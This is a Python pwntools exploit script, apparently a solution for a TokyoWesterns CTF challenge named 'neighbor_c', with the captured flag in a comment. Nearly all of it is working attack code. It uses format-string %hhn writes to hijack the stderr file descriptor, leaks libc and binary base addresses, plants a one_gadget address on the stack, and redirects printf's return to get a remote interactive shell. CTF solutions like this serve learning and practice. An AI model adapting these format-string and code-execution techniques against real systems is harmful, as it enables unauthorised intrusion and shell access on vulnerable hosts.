#!/usr/bin/env python
# coding: utf-8

from pwn import *

# TWCTF{You_understand_FILE_structure_well!1!1}

local = False

# aggressive alias

r = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
se = lambda x: p.send(x)
sel = lambda x: p.sendline(x)
pick32 = lambda x: u32(x[:4].ljust(4, '\0'))
pick64 = lambda x: u64(x[:8].ljust(8, '\0'))

# module structure & function

libc_remote = {
	'base': 0x0,
	'stderr': 0x3c2590,
	'one_gadget': 0xf1651
}

libc = libc_remote

elf = {
	'base': 0x0,
	'leaked': 0x962,
	'ret': 0x964
}


def set_base(mod, ref, addr):
	base = addr - mod[ref]
	for element in mod:
		mod[element] += base

def fmts(pay):
	last = 0
	payload = ''
	for off,b in pay:
		t = ord(b)
		c = t - last
		if c <= 0:
			c += 256
		payload += '%{}c%{}$hhn'.format(c, off)
		last = t
	sel(payload)

def fmt(off, b):
	if b == 0 or b == '\0':
		c = 256
	else:
		c = ord(b)
	
	sel('%{}c%{}$hhn'.format(c, off))
	if not local:
		time.sleep(1)

def rbp1(b):
	fmt(7, b);

def rbp2(b):
	fmt(11, b);

while True:
	if local:
		p = process('./neighbor_c-310f2ca86ab0025591c201502ccb4bc3a13b30350b106e693cf483fbdb2b76b1', env={'LD_PRELOAD': './libc-a3c98364f3a1be8fce14f93323f60f3093bdc20ba525b30c32e71d26b59cd9d4.so.6'}, aslr=False)
	else:
		p = remote('neighbor.chal.ctf.westerns.tokyo', 37565)

	# Try to overwrite stderr fileno to 1, then we could get leak

	ru('to our mayor.\n')
	rbp1('\x70')
	rbp2('\x90')
	fmt(5, '\x01')

	sel('lotus1337')
	if 'lotus1337' in p.recvuntil('lotus1337', timeout=2):
		print('[+] Hit!')
	else:
		p.close()
		del p
		continue

	sel('AAAA%5$llxBBBB%7$llxCCCC%10$llxDDDD')
	ru('AAAA')
	stderr = int(rud('BBBB'), 16)
	print('[+] stderr fileno @ %#x' % stderr)
	set_base(libc, 'stderr', stderr)
	print('[+] libc base @ %#x' % libc['base'])

	rbp1_val = int(rud('CCCC'), 16)
	printf_ret = rbp1_val - 0x38
	gadget = rbp1_val - 0x30
	rsi = rbp1_val + 0x18
	print('[+] rbp1 = %#x' % rbp1_val)
	print('[+] printf ret addr @ %#x' % printf_ret)

	leaked_elf = int(rud('DDDD'), 16)
	set_base(elf, 'leaked', leaked_elf)
	print('[+] elf base @ %#x' % elf['base'])

	# Clear rsi on stack
	for i in range(8):
		rbp1(p8((rsi + i) & 0xFF))
		rbp2(0)

	# Put one_gadget
	for i in range(8):
		rbp1(p8((gadget + i) & 0xFF))
		rbp2(p8((libc['one_gadget'] >> (8 * i)) & 0xFF))

	# Overwrite printf return address to ret
	rbp1(p8(printf_ret & 0xFF))
	rbp2(p8(elf['ret'] & 0xFF))

	p.interactive()
	break
